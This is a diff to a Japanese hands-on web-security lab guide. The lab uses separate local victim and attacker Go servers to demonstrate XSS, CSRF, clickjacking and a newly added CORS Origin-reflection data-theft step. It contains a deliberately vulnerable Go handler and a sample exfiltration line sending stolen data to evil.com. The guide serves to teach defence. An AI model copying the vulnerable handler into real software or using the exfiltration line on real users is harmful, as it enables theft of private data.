@@ -71,7 +71,7 @@ graph TD
 
 ### CORS 設定ミスによる情報漏洩 (Cross-Origin Data Leakage)
 
-CORS の誤設定（特に `Access-Control-Allow-Origin: *`）により、攻撃者がユーザーの機密データを取得できる脆弱性です。
+CORS の誤設定（特に Origin ヘッダーの反射）により、攻撃者がユーザーの機密データを取得できる脆弱性です。
 
 ```mermaid
 sequenceDiagram
@@ -91,7 +91,7 @@ sequenceDiagram
     B->>S: GET /api/sensitive-data<br/>Origin: evil.com<br/>Cookie: session_id=...
 
     Note over S: 4. サーバーがCookieで認証
-    S->>B: 200 OK<br/>Access-Control-Allow-Origin: *<br/>{"data": "secret"}
+    S->>B: 200 OK<br/>Access-Control-Allow-Origin: evil.com<br/>Access-Control-Allow-Credentials: true<br/>{"data": "secret"}
 
     Note over B, E: 5. ブラウザがCORSチェック（*は全て許可）
     B->>E: レスポンスをJavaScriptに渡す
@@ -103,9 +103,9 @@ sequenceDiagram
 **なぜ攻撃が成功するのか？**
 
 1. **ユーザーはログイン済み**: Cookie がブラウザに保存されている
-2. **CORS が過寬大**: `Access-Control-Allow-Origin: *` により、どのオリジンからのリクエストでもレスポンスを読み取り可能
+2. **CORS が過寛大**: Origin ヘッダーをそのまま反射するため、どのオリジンからのリクエストでもレスポンスを読み取り可能
 3. **Cookie は自動送信**: クロスオリジンのリクエストでも Cookie が送信される
-4. **ブラウザがレスポンスを許可**: CORS ポリシーが `*` なので、JavaScript がレスポンスを読める
+4. **ブラウザがレスポンスを許可**: Origin が反射されるため、JavaScript がレスポンスを読める
 
 ---
 
@@ -116,22 +116,24 @@ sequenceDiagram
 |**XSS**|ユーザー入力をそのまま HTML として出力する|出力を適切にエスケープする、CSPを設定する|
 |**CSRF**|Cookie だけに頼った認証を行う|CSRFトークンを使用する、SameSite属性を設定する|
 |**クリックジャッキング**|外部サイトからの iframe 埋め込みを許可している|`X-Frame-Options` または CSP の `frame-ancestors` を設定する|
-|**CORS 設定ミス**|`Access-Control-Allow-Origin: *` を使用|特定のオリジンのみ許可、`*` は慎重に|
+|**CORS 設定ミス**|Origin ヘッダーをそのまま反射する|許可リストに基づく特定オリジンのみ許可|
 
 ---
 
 ## アーキテクチャ
 
-この実習では、一つの Go アプリケーションの中で「被害者サイト（Victim）」と「攻撃者サイト（Attacker）」の両方のエンドポイントを提供します。
+この実習では、2つの Go アプリケーションがそれぞれ別ポートで動作します。「被害者サイト（Victim）」と「攻撃者サイト（Attacker）」が別オリジンになるため、CSRF や CORS のデモが現実に近い形で体験できます。
 
-### 想定ディレクトリ構造
+### ディレクトリ構造
 
 ```text
 infra/assets/web_security/
-├── main.go         # 脆弱なアプリケーション
-├── go.mod
-├── Dockerfile
-└── docker-compose.yml
+├── victim/
+│   ├── main.go         # 被害者サイト (port 8080)
+│   └── go.mod
+└── attacker/
+    ├── main.go         # 攻撃者サイト (port 8081)
+    └── go.mod
 ```
 
 ---
@@ -140,9 +142,16 @@ infra/assets/web_security/
 
 ### 1. アプリケーションの起動
 
+ターミナルを2つ開き、それぞれでサーバーを起動します。
+
 ```bash
-cd infra/assets/web_security
-podman compose up -d
+# ターミナル1: 被害者サイト
+cd infra/assets/web_security/victim
+go run main.go
+
+# ターミナル2: 攻撃者サイト
+cd infra/assets/web_security/attacker
+go run main.go
 ```
 
 ### 2. 動作確認
@@ -187,7 +196,7 @@ podman compose up -d
     単に URL をリクエストするだけでデータを外部送信できるため
 ```
 
-**脆弱なコード (victim/main.go:74-77):**
+**脆弱なコード (victim/main.go:77-80):**
 
 ```go
 for _, c := range data.Comments {
@@ -233,7 +242,7 @@ HTML出力: <p>0 results found for "<img src=x onerror=alert(document.cookie)>".
    <img onerror> はフィルタをバイパスできる
 ```
 
-**脆弱なコード (victim/main.go:81-86):**
+**脆弱なコード (victim/main.go:84-89):**
 
 ```go
 func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
@@ -360,7 +369,7 @@ Cookieによる「認証」は成功 → メールアドレスが変更される
 └─────────────────────────────────────┘
 ```
 
-**脆弱なコード (victim/main.go:116-136):**
+**脆弱なコード (victim/main.go:119-139):**
 
 ```go
 func followHandler(w http.ResponseWriter, r *http.Request) {
@@ -379,6 +388,89 @@ func followHandler(w http.ResponseWriter, r *http.Request) {
 ```javascript
 // 攻撃者は被害者のボタン位置を把握し、偽ボタンの位置を調整
 // padding-top: 105px → 被害者のボタンと位置が一致
+```
+
+---
+
+### STEP 5: CORS 設定ミス (Cross-Origin Data Leakage) ～別サイトからのデータ窃取～
+
+API がリクエストの Origin ヘッダーをそのまま反射していると、攻撃者サイトから Cookie を含めたリクエストでユーザーの機密データを取得できます。
+
+**実施手順:**
+
+1. 被害者サイト（port 8080）で `Login` ボタンを押してセッション Cookie をセットします。
+2. 攻撃者サイトの `CORS Attack Page (port 8081)` リンクをクリックします。
+3. 「Verify Account」ボタンをクリックします。
+4. 被害者サイトの `/api/profile` から名前、メールアドレス、API キーが窃取されて画面に表示されることを確認します。
+
+**何が起きているのか？**
+
+```text
+[攻撃者サイトのJavaScript]
+fetch('http://localhost:8080/api/profile', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => { /* データを表示 */ })
+
+↓ ブラウザがプリフライトリクエスト送信
+
+OPTIONS /api/profile HTTP/1.1
+Host: localhost:8080
+Origin: http://localhost:8081
+
+↓ 被害者サーバーのレスポンス（❌ 脆弱性: Origin をそのまま反射）
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: http://localhost:8081   ← Origin を反射！
+Access-Control-Allow-Credentials: true
+
+↓ ブラウザが実際のリクエスト送信
+
+GET /api/profile HTTP/1.1
+Host: localhost:8080
+Origin: http://localhost:8081
+Cookie: session_id=secret-session-123  ← credentials: 'include' で送信！
+
+↓ 被害者サーバーのレスポンス
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://localhost:8081   ← Origin を反射
+Access-Control-Allow-Credentials: true
+Content-Type: application/json
+
+{"name":"Alice Victim","email":"victim@example.com","secret":"my-secret-api-key-abc123"}
+
+↓ ブラウザのCORSチェック
+
+Origin が一致 → 許可
+→ 攻撃者サイトのJavaScriptがレスポンスを読み取れる！
+```
+
+**脆弱なコード (victim/main.go:141-):**
+
+```go
+func profileHandler(w http.ResponseWriter, r *http.Request) {
+    // ❌ 脆弱性: Origin ヘッダーをそのまま反射
+    origin := r.Header.Get("Origin")
+    w.Header().Set("Access-Control-Allow-Origin", origin)
+    w.Header().Set("Access-Control-Allow-Credentials", "true")
+
+    // 認証済みユーザーの機密データを返す
+    json.NewEncoder(w).Encode(profile)
+}
+```
+
+**なぜ攻撃が成功するのか？**
+
+1. **ユーザーはログイン済み**: Cookie がブラウザに保存されている
+2. **Origin が反射される**: サーバーが Origin を検証せずそのまま返すため、どんなオリジンでも許可される
+3. **Credentials が許可**: `Access-Control-Allow-Credentials: true` により Cookie が送信される
+4. **プリフライトも通過**: OPTIONS リクエストでも同じ反射が行われる
+
+**実際の攻撃では:**
+
+```text
+攻撃者は窃取したデータを自サーバーに送信:
+new Image().src='https://evil.com/collect?d='+JSON.stringify(data)
 ```
 
 ---
@@ -1182,13 +1274,14 @@ document.getElementById("output").innerHTML = hash;  // エスケープなしで
 4. **HttpOnly属性が設定されたCookieは、JavaScriptから読み取れますか？**
    - <details><summary>解答</summary>いいえ、HttpOnly属性が設定されたCookieは`document.cookie`で読み取ることができません。XSSによるCookie盗難を防げます。</details>
 
+5. **Origin ヘッダーをそのまま反射するCORS設定はなぜ危険ですか？**
+   - <details><summary>解答</summary>Originをそのまま反射すると、どんなオリジンからのリクエストでも許可されてしまいます。`Access-Control-Allow-Credentials: true` と組み合わさると、攻撃者サイトからCookie付きリクエストで機密データを窃取できます。</details>
+
 ---
 
 ## 片付け
 
-```bash
-podman compose down
-```
+各ターミナルで `Ctrl+C` を押してサーバーを停止してください。
 
 ---
 
@@ -1212,7 +1305,8 @@ podman compose down
 
 **A:** ブラウザの iframe ブロック機能が動作している可能性があります。
 
-- 別オリジンとして扱われないよう、同じ localhost:8080 でアクセスしているか確認
+- 被害者サイト（localhost:8080）と攻撃者サイト（localhost:8081）が両方起動しているか確認
+- 攻撃者サイトのiframe srcが `http://localhost:8080/follow` を指しているか確認
 
 ---
 
